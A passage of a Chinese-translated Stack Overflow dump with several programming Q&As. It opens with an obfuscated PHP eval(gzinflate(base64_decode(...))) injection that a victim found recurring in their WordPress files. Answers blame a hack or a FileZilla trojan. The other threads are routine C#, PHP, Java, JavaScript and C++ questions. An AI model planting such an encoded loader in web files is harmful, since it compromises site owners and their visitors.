eval(gzinflate(base64_decode("JcxLDoMwDEXROVL3EHkBeMCsfLqRTKxgKYE0WLFVtbsvkOnRe5dDPBxMGmoSc/YTnj0Yfw03+lBjD05rOD2ayRMxp7KrHbRqX9hw55y53tpLlFda5+G8FHpfrTYmUw/LhC24wPjo/g==")));
#/c3284d# 
```

所以我删除了它，但它第二天又回来了。

这怎么可能？我是病毒和安全方面的新手，所以答案可能非常基础。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-27T01:09:08.370

恭喜！你已经被黑客入侵！很可能您已经有很长一段时间没有更新您的软件，并且多个黑客已经利用了您软件中的一些众所周知的漏洞。

你如何解决它？焦土……你已经被许多机器人入侵了，并且可能像某种妓女一样在网上出售。删除整个 Web 根目录并从头开始。确保您拥有每个插件和 Wordpress 的最新版本。

根据记录，Wordpress 是由猴子或儿童或儿童猴子编写的……无论如何，它是迄今为止我破解过的最糟糕的应用程序之一。他们可能仍在使用您的密码哈希作为会话 ID，这意味着他们甚至不了解您为什么应该对密码进行哈希处理的基础知识。

哦，如果你一直被黑客入侵，那 **就是专业人士了**。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-22T16:16:50.400

问题解决了，wordpress 不负责。

有一个感染 filezilla 的木马，当你打开它时，它会在它可以通过 filezilla 访问的每个页面中注入代码。

这真的是一件大事，3个杀毒软件甚至都找不到它。

如果您看到，请格式化您的计算机。

# c# - 试图从类中获取数据到主程序

> ID：13093483
> 
> 赞同：0
> 
> 时间：2012-10-26T19:50:52.790
> 
> 标签：c#, class, return

我是 C# 新手，所以如果我的代码格式错误，我深表歉意。目前我正在尝试研究如何从计算数据距离的类中返回一个值。

到目前为止，这是我所拥有的，当我问一两点时，唯一出来的是 DistanceGenerator.Coursework 我看不出我做错了什么，有什么帮助吗？

```
namespace DistanceGenerator
{
    class Program
    {
        static void Main(string[] args)
        {

            //Displays data in correct Format

            List<float> inputList = new List<float>();
            TextReader tr = new StreamReader("c:/users/tom/documents/visual studio 2010/Projects/DistanceCalculator3/DistanceCalculator3/TextFile1.txt");
            String input = Convert.ToString(tr.ReadToEnd());
            String[] items = input.Split(',');
            Console.WriteLine("Point         Latitude        Longtitude       Elevation");

            for (int i = 0; i < items.Length; i++)
            {
                if (i % 3 == 0)
                {
                    Console.Write((i / 3) + "\t\t");
                }

                Console.Write(items[i]);
                Console.Write("\t\t");

                if (((i - 2) % 3) == 0)
                {
                    Console.WriteLine();
                }

            }

            Console.WriteLine();
            Console.WriteLine();

            // Ask for two inputs from the user which is then converted into 6 floats and transfered in class Coordinates

            bool exit = false;
            do
            {

                Console.WriteLine("Please enter the two points that you wish to know the distance between:");
                string point = Console.ReadLine();
                string[] pointInput = point.Split(' ');

                int pointNumber = Convert.ToInt16(pointInput[0]);
                int pointNumber2 = Convert.ToInt16(pointInput[1]);

               double latitude = (Convert.ToDouble(items[pointNumber * 3]));
               double longtitude = (Convert.ToDouble(items[(pointNumber * 3) + 1]));
               double elevation = (Convert.ToDouble(items[(pointNumber * 3) + 2]));

               double latitude2 = (Convert.ToDouble(items[pointNumber2 * 3]));
               double longtitude2 = (Convert.ToDouble(items[(pointNumber2 * 3) + 1]));
               double elevation2 = (Convert.ToDouble(items[(pointNumber2 * 3) + 2]));

                //Calculate the distance between two points
                Distance curDistance = new Distance(latitude, longtitude, elevation, latitude2, longtitude2, elevation2);

                Console.WriteLine(curDistance);

                Console.WriteLine("If you wish to calculate another distance type 1 and return, if you wish to end the program, type -1.");

                string reset;

                do
                {
                    reset = Console.ReadLine().Trim();
                }
                while (reset != "1" && reset != "-1");

                if (reset == "-1") exit = true;
            }
            while (!exit);

        }
    }
} 
```

//这里是类

```
namespace DistanceGenerator
{
    class Distance
    {
        private double latitude;
        private double longtitude;
        private double elevation;
        private double latitude2;
        private double longtitude2;
        private double elevation2;

        public Distance(double latitude, double longtitude, double elevation, double latitude2, double longtitude2, double elevation2)
        {
            // TODO: Complete member initialization
            this.latitude = latitude;
            this.longtitude = longtitude;
            this.elevation = elevation;
            this.latitude2 = latitude2;
            this.longtitude2 = longtitude2;
            this.elevation2 = elevation2;
        }

        private double curDistance()

        {

            const double PIx = 3.141592653589793;
            const double RADIO = 6371;

            double dlat = ((latitude2) * (PIx / 180)) - ((latitude) * (PIx / 180));
            double dlon = ((longtitude2) * (PIx / 180)) - ((longtitude) * (PIx / 180));

            double a = (Math.Sin(dlat / 2) * Math.Sin(dlat / 2)) + Math.Cos((latitude) * (PIx / 180)) * Math.Cos((latitude2) * (PIx / 180)) * (Math.Sin(dlon / 2) * Math.Sin(dlon / 2));
            double angle = 2 * Math.Atan2(Math.Sqrt(a), Math.Sqrt(1 - a));
            double ultimateDistance = (angle * RADIO);

            return ultimateDistance;

        }

    }
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-26T19:53:35.087

`curDistance`在您的`Main`方法中是该类的一个*实例。*`Distance`

类上的`curDistnace` *方法*`Distnace`是`private`，使其在类外无法使用-您可以使它`public`：

```
public double curDistance() 
```

您不想输出类，而是计算的值。为此，您需要调用实例上的*方法* （您也混淆了它的名称）：`curDistance``Distance``curDistance`

```
Console.WriteLine(curDistance.curDistance()); 
```

# php - 用mysql数据按高低价排序

> ID：13093484
> 
> 赞同：0
> 
> 时间：2012-10-26T19:50:58.413
> 
> 标签：php, html, mysql

这就是我所拥有的，以及我想要做的：

我的 MySql 数据库中有 12 个项目。4 个产品为 4.99，4 个产品为 3.99，4 个产品为 2.99。

我意识到我可以像这样查询数据库，它会给我一个该价格的产品列表：

```
<?php

$query = "SELECT * FROM UFPProducts WHERE price = 4.99";
$results = mysql_query ($query, $connect);

while ($row = @ mysql_fetch_array($results))
{

print

"<div id= 'item'>" .

"<p>Product id ".$row["ProductID"]."</p>".
"<p><img src=".$row["Image"]."></p>".
"<p>&pound".$row["Price"]."</p>".
"<p>".$row["Description"]."</p>".

"</div>";
}

?> 
```

但是，我想要的是一个可以按价格对产品进行分类的按钮。

这样做的简单方法是什么？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T19:52:20.473

试试这个查询

```
$query = "SELECT * FROM UFPProducts order by price ASC"; 
```

上述查询将按升序列出所有价格。但是，如果您想将不同的价格组合在一起，请使用以下查询。

```
$query = "SELECT * FROM UFPProducts group by price order by price ASC"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-26T19:59:00.627

您将需要创建一个执行新查询的按钮，然后输出这些新结果。

首先编写一个新查询：可能类似于`"SELECT * FROM UFPProducts ORDER BY price DESC";`.

然后以 HTML 格式构建 UI，访问者将使用按价格排序。一个简单的解决方案是链接到运行新查询的新页面。您可以使用 AJAX 来提供更优雅的解决方案。

最后，显示新查询的结果；可能通过重新使用您现有的打印语句。

# php - php 变量中的 html

> ID：13093490
> 
> 赞同：0
> 
> 时间：2012-10-26T19:51:24.037
> 
> 标签：php, variables

我想把一些像 html 这样的程序化的东西放在一个变量中；

通常我们这样做：

```
<?php

$my_var = '

    <h1>some header</h1>

    some text.

';

?> 
```

现在我希望它看起来像这样：

```
<?php

$my_var = '

?>

    <h1>some header</h1>

    some text.

<?php

';

?> 
```

所以我们打开一个 php 代码，声明一个变量，在 php 之外做一些事情，然后重新打开 php 代码并关闭 var，我们得到 php 之外的东西，我们在那个变量中得到它。

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-26T19:54:00.090

```
<?php
ob_start();
?>
    <h1>some header</h1>
    some text.
<?php

$my_var = ob_get_contents();
ob_end_clean();

echo my_var;
?> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T19:54:37.293

我认为没有办法，因为 php 忽略了 php 标签之外的行。如果您在其他文件用户[file_get_contents中有 php](http://www.php.net/manual/en/function.file-get-contents.php)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-26T19:54:54.687

请检查 php heredoc

[http://php.net/manual/en/language.types.string.php](http://php.net/manual/en/language.types.string.php)

希望能帮助到你

# java - 为什么我的 java 代码不起作用？

> ID：13093491
> 
> 赞同：0
> 
> 时间：2012-10-26T19:51:23.757
> 
> 标签：java, linked-list, circular-list, josephus

我正在编写一些 Java 代码，这些代码应该使用循环链接列表来实现众所周知的约瑟夫斯问题。以下是有关约瑟夫斯问题的一些信息：[http ://en.wikipedia.org/wiki/Josephus_problem](http://en.wikipedia.org/wiki/Josephus_problem)

我有一个学生班和司机班，它们被分配给我来创建我的约瑟夫斯班。

这是学生课程： http: [//pastebin.com/4YgSA7CM](http://pastebin.com/4YgSA7CM)

这是驱动程序类： http: [//pastebin.com/Nb08Dtqk](http://pastebin.com/Nb08Dtqk)

这两个类都不能修改。

我必须从头开始制作一个 Josephus 类，该类使用有效利用 Josephus 问题的循环链表。

这是我完成的 Josephus 类，没有编译器错误：

```
/** Implementation of Josephus problem.  The Josephus problem
    is named after the historian Flavius Josephus.  For more
    information on this problem visit:
    http://en.wikipedia.org/wiki/Josephus_problem
  */
import java.util.ListIterator;
import java.util.NoSuchElementException;
import java.util.ArrayList;

public class Josephus <E> {
 private Node<E> head;
 private int count;  // number of elements in the list

 /** Constructs an empty Josephus circle */
 // Complexity O(1)
 public Josephus() {

    head = null;
    count = 0;
 }
 /** Constructs an Josephus circle by adding the
     elements from an arraylist
     @param array The ArrayList of items of type E
   */
 // Complexity: O(n)
 public Josephus(ArrayList<E> array) {
             head = null;
             for (int i = 0; i < array.size(); i++)
                     add(array.get(i));
 }

 /** Inserts the specified element in the list at the
     last position
     @param dataItem the element to add
   */
 // Complexity O(1)
 @SuppressWarnings({ "unchecked" })
    public void add(E dataItem) {

     Node <E> node = new Node <E> (dataItem, null, null);
            if (count == 0) // list is empty
                    head = node.previous= node ;

            else
               head.previous.next = node;
               node.previous = head.previous;

               head.previous = node;

            count++;
 }
         // To be completed by the student

 /** Inserts the specified element in the list at the
     end.  This method has the same behavior as add(E)
         @param dataItem the element to add at the end
       */
 // Complexity O(1)
 public void addLast(E dataItem) {
             add(dataItem);
 }

 /** Inserts the element at the beginning of the list
     @param dataItem The element to be added
   */
 // Complexity O(1)
 public void addFirst(E dataItem) {
             Node<E> node = new Node <E>(dataItem, null, null);
             // To be completed by the student

             if (head == null) // list is empty
                  head = head.previous = node;

         else {
            node.next = head;
            head.previous = node;
            head = node;
         }
         count++;
 }

 /** removes the element from the beginning of the list
     @return  The element that was remvoed
     @throws NoSuchElementException if the list is empty
   */
 // Complexity O(1)
 public E removeFirst() {
        // To be completed by the student
     if (head != null) {
                     E item = head.data;

                     if (head == head.previous) // list has only one element
                        head = head.previous = null;

                     else {  // list has more than 1 element
                        head = head.next;
                        head.previous = null;
                     }
                     count--;
                 return item;
         }
     else throw new NoSuchElementException();
     }

     /** removes the element from the end of the list
         @return  The element that was remvoed
         @throws NoSuchElementException if the list is empty
       */
      // Complexity O(1)
      public E removeLast() {
             // to be completed by the student
              if (head.previous != null) {
                            E item = head.previous.data;

                            if (head == head.previous) // list has only one item
                               head = head.previous = null;

                            else {  // list has more than one element
                                    head.previous = (head.previous).previous;
                                    head.previous.next = null;
                        }
                            count--;
                            return item;
                }
                    else throw new NoSuchElementException();
         }

     /** returns a reference to the element at
         position index
         @param index The index of the element being sought
         @return A reference to the element at position index
         @throws IndexOutOfBoundsException if index is out of range
       */
     // Complexity O(n)
     public E get(int index)  {
             if ((index < 0) || (index >= count))
                 throw new IndexOutOfBoundsException(Integer.toString(index));
             Node<E> temp = head;
             for (int i = 0; i < index; i++)
                temp = temp.next;
             return temp.data;
 }

 /** Sets the element at position index to reference
     anEntry.
     @param index The position of the element that is to
     be set
     @param anEntry The new value at position index
     @return the element that was previously at position index
     @throws IndexOutOfBoundsException if index is out of range
   */
 // Complexity O(n)
 public E set(int index, E anEntry) {
     if ((index < 0) || (index >= count))
                 throw new IndexOutOfBoundsException(Integer.toString(index));
             Node<E> temp = head;
             for (int i = 0; i < index; i++)
                temp = temp.next;
             E result = temp.data;
             temp.data = anEntry;
             return result;
 }

 /** Inserts the specified element in the list at a
     given index
     @param index The position at which the new element
     has to be inserted
     @param anEntry The element to add
     @throws IndexOutOfBoundsException if index is out of range
   */
     // Complexity O(n)
     public void add(int index, E anEntry) {
             // To be completed by the student
               if ((index < 0) || (index > count))
                       throw new IndexOutOfBoundsException(Integer.toString(index));

               if (index == 0) addFirst(anEntry);
               else if (index == count) addLast(anEntry);
               else {

                       Node <E> node = head;
                       int i = 0;
                       while(node!=null && i<index){                 
                               i++;
                               node = node.next;
                       }
                   Node<E> newNode = new Node <E> (anEntry, node, node.next);
                   node.next.previous = newNode;
                   node.next = newNode;
                   count++;
           }
     }

     /** searches for target and returns the position of the
         first occurrence, or -1 if it is not in the list
         @param target The element we are searching for
         @return The position of target if found; -1 if not found
       */
     // Complexity O(n)
     public int indexOf(E target) {
             Node<E> temp = head;
             for (int i = 0; i < count; i++) {
                     if (temp.data.equals(target)) return i;
                     temp = temp.next;
         }
         return -1;
 }

 /** removes the element at position index
         @param index The index of the element to be removed
         @return The element that was removed
         @throws IndexOutOfBoundsException if index is invalid
       */
     // Complexity O(n)
     public E remove(int index) {
        // to be completed by the student
             if ((index < 0) || (index >= count))
                        throw new IndexOutOfBoundsException(Integer.toString(index));
             Node<E> temp = head;
             for(int i =0;i<index; i++)
                     temp = temp.next;
                 E result = temp.data;
                 temp.next = temp.previous;
                 return result;

 }

 /** sets the start position for the Josephus game
     @param index The starting position
     @throws IndexOutOfBoundsException if index is invalid
   */
 // Complexity O(n)
 public void setStartPosition(int index) {
             if ((index < 0) || (index >= count))
                throw new IndexOutOfBoundsException(Integer.toString(index));

             for (int i = 0; i < index; i++)
                 head = head.next;
 }

 /* This private utility method is used in startJosephus
    method.
    Complexity O(1)
  */
 private void removeAfter(Node<E> node) {
             node.next = node.next.next;
             node.next.previous = node;
             count--;
 }

 /** simulates the Josephus game by killing every other person
     until the winner is the only one left.
     @return The survivor of the game
   */
 public E startJosephus() {
     E item =head.data;
     if(head.next != null){
             if(head == head.previous)
                     return item;

             else
                     while(count>1);
            removeAfter(head);
            head =head.next;
 }
     return item;

     }

 /** Returns a list-iterator of the elements in this list
    (in proper sequence), starting at the beginning
    of the list.
  */
public ListIterator <E> iterator() {
       return new myIterator();
}

/** @return The number of elements in the list
  */
public int size() {
            return count;
}

// this is an inner clss implementing the ListIterator
// interface.
// visit http://docs.oracle.com/javase/1.4.2/docs/api/java/util/ListIterator.html
// for a complete list of methods in ListIterator

private class myIterator implements ListIterator <E> {
        private Node<E> forward = head;
        private Node<E> backward = head;
        private boolean firstTime = true;

        /** checks if a current item E  is the last
            in the collection
          */
        public boolean hasNext() {
            return (forward != null);
        }

        /** returns the next item in the collection if
           there is one.  If there is no more items
           throws NoSuchElementException
          */
        public E next() {
               if (forward == null) throw
                            new NoSuchElementException();
               else {
                       E item = forward.data;
                       forward = forward.next;
                       if (forward == head) forward = null;
                       return item;
               }
         }

         /** checks if a current item is the first
                 in the collection
           */
         public boolean hasPrevious() {
                 return (backward != null);
         }

         /** returns the previous item in the collection if
                 there is one.  If there is no more items
                 throws NoSuchElementException
           */
         public E previous() {
                 if (backward == null) throw
                        new NoSuchElementException();
                 else {
                        if (firstTime) {
                                    backward = backward.previous;
                                    firstTime = false;
                             }
                            E item = backward.data;
                        backward = backward.previous;
                        if (backward == head.previous) backward = null;
                        return item;
                 }
      }

          /* this operation is not supported */
          public void add(E obj) {
                    throw new UnsupportedOperationException();
          }

          /* this operation is not supported */
          public void set(E obj) {
                    throw new UnsupportedOperationException();
          }

          /* this operation is not supported */
          public int previousIndex() {
                  throw new UnsupportedOperationException();
          }

          /* this operation is not supported */
          public int nextIndex() {
                  throw new UnsupportedOperationException();
          }

          /* this operation is not supported */
          public void remove() {
                  throw new UnsupportedOperationException();
          }
}

private static class Node <E> {
    private E data;
    private Node<E> next;
    private Node<E> previous;

   /** constructor Creates an empty node with both next and
       previous fields set to be null
       @param dataItem - item to be inserted
     */
   private Node(E dataItem) {
       data= dataItem;
       previous = next = null;
   }

   /** creates a new node that references another node
       @param dataItem The data stored
       @param previousNodeRef The node previous to this node
       @param nextNodeRef The node next to this node
     */
   private Node(E dataItem, Node<E> previousNodeRef, Node <E> nextNodeRef ) {
           data = dataItem;
           previous = previousNodeRef;
       next = nextNodeRef;
   }
  }
} 
```

我的 startJosephus 方法是我认为的主要问题。虽然不完全确定。这是上面代码中的 startJosephus 方法：

```
/** simulates the Josephus game by killing every other person
     until the winner is the only one left.
     @return The survivor of the game
   */
 public E startJosephus() {
   E item =head.data;
   if(head.next != null){
         if(head == head.previous)
                 return item;

         else
                 while(count>1);
        removeAfter(head);
        head =head.next;
}
 return item;

 } 
```

这是我运行 Josephus 课程时正在运行的内容：http: [//pastebin.com/5GnChgYd](http://pastebin.com/5GnChgYd)

这是应该产生的输出：http: [//pastebin.com/Qr5dCZJp](http://pastebin.com/Qr5dCZJp)

此外，以下是用于生成此输出的两个输入文件：

StudentList1.txt：[http ://pastebin.com/ysjevQ8u](http://pastebin.com/ysjevQ8u)

StudentList2.txt：[http ://pastebin.com/r2YeppNm](http://pastebin.com/r2YeppNm)

根据我得到的输出和我应该得​​到的输出，约瑟夫斯问题似乎没有开始并模拟杀戮狂欢。但是，我不知道我的代码有什么问题。我的代码不能有尾巴，因为它是一个循环链接列表。关于我在这里做错了什么的任何想法？抱歉所有 Pastebin 链接，这似乎是组织我在这里展示的所有代码的更好方法。希望听到你的想法。

```
EDIT: 
There are 21 persons in this list
The game starts with McElroy,Breanna at starting position 
The killing spree begins......
The sole survivor at the end of this gruesome game is McElroy,Breanna
Exception in thread "main" java.lang.NullPointerException
at Josephus$Node.access$5(Josephus.java:383)
at Josephus.add(Josephus.java:49)
at Josephus.addLast(Josephus.java:66)
at Driver.main(Driver.java:96) 
```

这是我在解决无限循环问题后遇到的新运行时错误。有什么建议么？？？？所有这些空指针异常是什么

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-26T20:01:06.630

```
if(head.next != null) {
     if (head == head.previous)
        return item;
     else
        while(count>1);
         removeAfter(head);
         head =head.next; 
```

这段代码在所有情况下都将永远循环，除非`head.next`是 null 或`head == head.previous`，在游戏开始时总是如此。因此，除了琐碎的初始条件之外，您的程序将永远循环。显然，你打算写

```
if(head.next != null) {
     if (head == head.previous)
        return item;
     else
        while(count>1) {
         removeAfter(head); 
         head =head.next;
        } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T20:03:28.070

我认为你有一个无限循环：

```
while (count > 1); 
```

# php - 在表单和持久性之间共享注释验证规则

> ID：13093494
> 
> 赞同：0
> 
> 时间：2012-10-26T19:51:36.213
> 
> 标签：php, doctrine, zend-framework2

一个“简单”的问题： http: [//mwop.net/blog/2012-07-02-zf2-beta5-forms.html](http://mwop.net/blog/2012-07-02-zf2-beta5-forms.html)

是否可以在不使用 zend 表单的情况下使用 zf2 zend 表单注释验证规则，所以我可以在模型验证器（例如，在持久化之前使用检查模型是否正确）和 zend 表单验证之间共享验证规则？

如果我的“名字”不应该是空的并且在 5 到 20 个字符之间，那么表格和模型的规则是一样的。

我希望我明确指出

罗马

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-26T20:24:38.707

好吧，由于模型获取的所有数据都来自用户输入或数据库，因此您也不需要测试模型本身。数据库里面的数据应该是正确的！

IE：相信自己的数据而不相信用户？

但是，如果您仍然想这样做，我想您可以使用 AnnotationBuilder 构建表单，然后从表单中获取 InputFilters（我确定有一个方法，可能基于每个元素），然后在您的模型中使用它们 - 但是正如我的第一段所暗示的那样，我认为这是一个非常无用的观点:)

至于多个可用的输入过滤器，最好的办法是在每个模型的基础上编写自己的扩展[Zend\InputFilter\InputFilter的类。](http://framework.zend.com/manual/2.0/en/modules/zend.input-filter.intro.html)当您构建表单时，您可以将该类作为过滤器定义附加，`$form->setInputFilter($myModelInputFilterClass)`您还可以在模型中调用该类以通过这些过滤器运行您的数据。我没有手动完成此操作，但它应该可以工作。

如果您遇到必需的语句，我猜唯一的陷阱可能会发生。在每个元素的基础上检查，我不知道这是否也有效。由于 InputFilter 检查所有给定的过滤器。虽然如果你导入一个完整的 CSV-Sheet 或其他东西，你会有一个`populateFromCsv()`函数或其他东西，然后我想无论如何都会检查所有数据。

# drop-down-menu - DropDown 应该使用哪个 dojo 小部件

> ID：13093498
> 
> 赞同：1
> 
> 时间：2012-10-26T19:51:39.890
> 
> 标签：drop-down-menu, dojo

我希望创建动态下拉菜单，这意味着第二个下拉菜单的值会随着第一个下拉菜单的选择而变化。我正在查看 Dojo 文档，似乎可以使用 3 个不同的小部件，

[dijit/表单/组合框](https://dojotoolkit.org/reference-guide/1.8/dijit/form/ComboBox.html#declarative-markup-using-native-select-and-option-tags)

[dojox/form/DropDownSelect](http://dojotoolkit.org/reference-guide/1.8/dojox/form/DropDownSelect.html#a-simple-dropdownselect)

[dijit.form.Select](http://dojotoolkit.org/reference-guide/1.8/dijit/form/Select.html#a-simple-declarative-select)

现在我很困惑我应该使用哪个来创建动态下拉菜单？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-20T16:55:22.170

dojo 下拉菜单的区别：

1.  Select 它是一个简单的组合框，就像 HTML 中的 select 一样，没有验证，并且在 select 选项中不提供任何搜索工具。

2.  ComboBox 它是组合框的纯形式，并再次命名为 ComboBox，它不会提供任何默认验证，但它在其选项中提供搜索工具。

3.  FilteringSelect 它是一种高级形式的选择，具有默认的验证和搜索功能。它还具有取值的属性，因为输入标签在 HTML 中取值。

在 dojo 中，您还可以尝试在 dojox 库中提供的自定义验证。我希望它会帮助你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-27T06:23:24.443

您可以根据需要的额外功能选择任何人。虽然 dijit.form.Select 是您的普通 HTML 选择，但组合框和过滤选择提供更多功能。

关注[http://kennethfranqueiro.com/2010/06/combobox-vs-filteringselect/](http://kennethfranqueiro.com/2010/06/combobox-vs-filteringselect/)对两者进行比较。你也可以和他们一起玩，了解他们是如何工作的。

我在我的应用程序中使用了 FilteringSelect 来实现与需要相同的行为。

# java - 如何在 EDT 上运行 JOptionPane？

> ID：13093499
> 
> 赞同：3
> 
> 时间：2012-10-26T19:51:49.647
> 
> 标签：java, swing, joptionpane, event-dispatch-thread

我*仍然*遇到空白`JOptionPane`s 的问题。根据 SO 和*Java Docs*的研究，这显然与不使用`EDT`. `EDT`我的问题是及其方法究竟是如何应用的`JOptionPane`？例如，终端错误输出清楚地表明`JOptionPane`以下内容未在`EDT`. 具体缺少什么，以及类似的东西如何`Runnable`适应？

```
import javax.swing.*;
public class PaneDemo
{
public static void main(String[] args)
{
    final String[] TEXT ={
            //message
            "Hello, World!",
            //title
            "Greeting"};//end TEXT
    showMyPane(TEXT);
}//end main
public static void showMyPane(final String[] TEXT)
{
    JOptionPane.showMessageDialog(null, TEXT[0], TEXT[1], 
        JOptionPane.INFORMATION_MESSAGE);
    if(!SwingUtilities.isEventDispatchThread())
    {
        System.err.println("Err: GUI failed to use EDT.");
    }//end if(!SwingUtilities.isEventDispatchThread())
}//end showMyPane
}//end class PaneDemo 
```

一个答案建议添加`invokeLater`. 然而，这似乎在 BlueJ 中渲染得不是很好。

![BlueJ 截图](../Images/e94facece38fd2489e0190177034a74e.png)

同样 isEventDispatchThread() 仍在终端中返回错误。仅仅是因为它现在在错误的位置吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-10-26T19:57:04.077

您可以像这样`JOptionPane`在[事件调度线程](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/dispatch.html)上创建：

![在此处输入图像描述](../Images/70601bf5eeeed2462f138713b1fdf1e8.png)

```
 final String[] TEXT = {
        //message
        "Hello, World!",
        //title
        "Greeting"};//end TEXT

     ...

    /**
     * Create GUI and components on Event-Dispatch-Thread
     */
    javax.swing.SwingUtilities.invokeLater(new Runnable() {
        @Override
        public void run() {
                JOptionPane.showMessageDialog(null, TEXT[0] 
                      + "\n is on EDT: " + SwingUtilities.isEventDispatchThread(), TEXT[1],
                        JOptionPane.INFORMATION_MESSAGE);
        }
    }); 
```

查看[课程：Swing 中的并发](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/index.html)它应该可以帮助您了解它的全部内容

**更新：**

根据评论，您应该在每个调用方法`JOptionPane`上启动，如下所示：`EDT``showPane(...)`

```
 public static void showMyPane(final String[] TEXT) {
        javax.swing.SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                JOptionPane.showMessageDialog(null, TEXT[0] 
                      + "\n is on EDT: " + SwingUtilities.isEventDispatchThread(), TEXT[1],
                        JOptionPane.INFORMATION_MESSAGE);
            }
        });
    }//end showMyPane

    public static void main(String[] args) {
        final String[] TEXT = {
            //message
            "Hello, World!",
            //title
            "Greeting"};//end TEXT
        showMyPane(TEXT);
    } 
```

# google-apps-script - 需要使用 googleappscript 编辑 gdoc

> ID：13093511
> 
> 赞同：0
> 
> 时间：2012-10-26T19:52:40.800
> 
> 标签：google-apps-script

我可以将 gdoc 的正文添加到电子邮件中吗？我有点知道该怎么做，但我不完全确定。我在下面写了这段代码来帮助我。我是新手，我已经设法运行了一些脚本，但我完全迷失了这个。我看过几个视频，这就是我能够做到的。代码如下。基本上我想要做的是能够让用户输入他的姓名和另一个变量，然后转到谷歌文档文件并将其更改为输入的值，然后将其放回电子邮件中并将其发送到地址......关于我做错了什么或我应该从哪里开始的任何想法？提前致谢。

```
function gsnot() {
var emailaddress="albdominguez25@gmail.net";
var sub="Subject1";
var pattern = Browser.inputBox("Enter your name");
var pattern2 = Browser.inputBox("Enter the minutes:");
var templateDocID= ScriptProperties.getProperty("EmailTemplateDocId");
var doc = DocumentApp.openById(templateDocID);
  var body = doc.getActiveSection()
var html = "";

var keys = {
name: pattern, 
min: pattern2,
};

for ( var k in keys ) {
body.replaceText("%" + k + "%", keys[k]);

doc.saveAndClose();
html = getDocAsHtml(docId);
DocsList.getFileById(docId).setTrashed(true);

return html;

var emailaddress="albdominguez25@gmail.net";
var sub="Subject1";

MailApp.sendEmail(emailaddress,sub, {htmlBody: body});}} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T10:14:51.100

您可能希望通过将文档中的正文读取到变量中来更改代码，对变量进行替换并将其插入到您的电子邮件中。例如：

```
function gsnot() {
  var emailaddress = "albdominguez25@gmail.net";
  var sub = "New Subject";
  var pattern  = Browser.inputBox("Enter your name:");
  var pattern2 = Browser.inputBox("Enter the minutes:");
  var templateDocID = ScriptProperties.getProperty("EmailTemplateDocId");
  var doc  = DocumentApp.openById(templateDocID);
  var body = doc.getText();
  var replacement;
  var k;

  var keys = {
    name: pattern, 
    min:  pattern2
  };

  for (k in keys) {
    if (keys.hasOwnProperty(k)) {
      replacement = new RegExp("%" + k + "%",'g');
      body = body.replace(replacement, keys[k]);
    }
  }
  MailApp.sendEmail(emailaddress,sub, '', {htmlBody: body});
} 
```

几点注意事项：

*   将所有 var 语句放在函数的开头是一种很好的形式
*   当您使用 for-in（例如 for (k in keys) ）时，它会返回对象的所有属性。你只想要你分配的那些。这就是原因： for (k in keys)
*   您为每个属性发送了邮件，我相信您希望它在 for-in 循环之外发送，因此仅在所有替换完成后才发送。
*   使用 replace()，您需要创建一个设置为全局的正则表达式对象，否则它只会替换模式的第一个实例（您有两次名称）。
*   在 sendEmail() 的参数中，即使您使用 htmlBody 选项，您也需要指定纯文本正文。我使用了空引号''。

# extjs - 在 Extjs 3.2.1 的 Ext.ux.grid.RowEditor 中检索“checkboxgroup”的值

> ID：13093514
> 
> 赞同：1
> 
> 时间：2012-10-26T19:52:47.703
> 
> 标签：extjs, extjs4, extjs3

我正在尝试在 extjs 的 RowEditor 网格中检索“复选框组”的选中值。到目前为止，我所做的是我在我的 RowEditor 列之一中创建了一个复选框组，如下所示

```
columns: [
{
             id: 'weekdays',
             header: 'Week Days',
             dataIndex: 'weekDays',
             width: 150,
             sortable: true,
             editor: {
                xtype: 'checkboxgroup',
                allowBlank: true,
                frame : true,
                vertical : true,
                columns: 2,
                items: [
                {boxLabel: 'Sunday', name: 'S', checked: true},
                {boxLabel: 'Monday', name: 'M', checked: true},
                {boxLabel: 'Tuesday', name: 'T', checked: true},
                {boxLabel: 'Wednesday', name: 'W', checked: true},
                {boxLabel: 'Thursday', name: 'T', checked: true},
                {boxLabel: 'Friday', name: 'F', checked: true},
                {boxLabel: 'Saturday', name: 'S', checked: true}
                ]
            }
        },{ ...........// rest other columns 
```

我尝试使用 getValue() 方法检索值，但没有成功。我试过了

```
 var schdeditor = new Ext.ux.grid.RowEditor({
        saveText: 'Update',
        listeners: {
        afteredit: function(object, changes, r, rowIndex) {
        // Do custom things
        var cm = object.grid.colModel, 
        fields = object.items.items;
        var weeks = fields[0].getValue(); 
```

当我运行它时，我的浏览器只是挂起，一段时间后我收到“堆栈溢出错误”

# c++ - Array 类的运算符重载

> ID：13093520
> 
> 赞同：3
> 
> 时间：2012-10-26T19:53:30.580
> 
> 标签：c++, overloading

我正在尝试为 Array 类重载运算符 << >> != == = 和 []。应用程序在运行时崩溃，但没有显示编译错误。什么可能是错的？IDE 使用 dev c++

这是array.h

```
#ifndef ARRAY_H
#define ARRAY_H

#include <iostream>
using namespace std;

class Array{
  friend ostream & operator << ( ostream &, const Array & );
  friend istream & operator >> ( istream &, Array &);
  private:
         int size;
         int * ptr;
  public:
         Array ( int = 10 );
         Array ( const Array & ); //copy constructor
         ~Array ();
         const Array &operator=( const Array & ); 
         bool operator == ( const Array & ) const; 
         bool operator != ( const Array & ) const;
         const int operator [] (int) const; 
         int getSize() const;            
};

#endif 
```

现在 array.cpp

```
#include <iostream>
using namespace std;
#include "array.h"

Array::Array (int sze ){ //default constructor edited
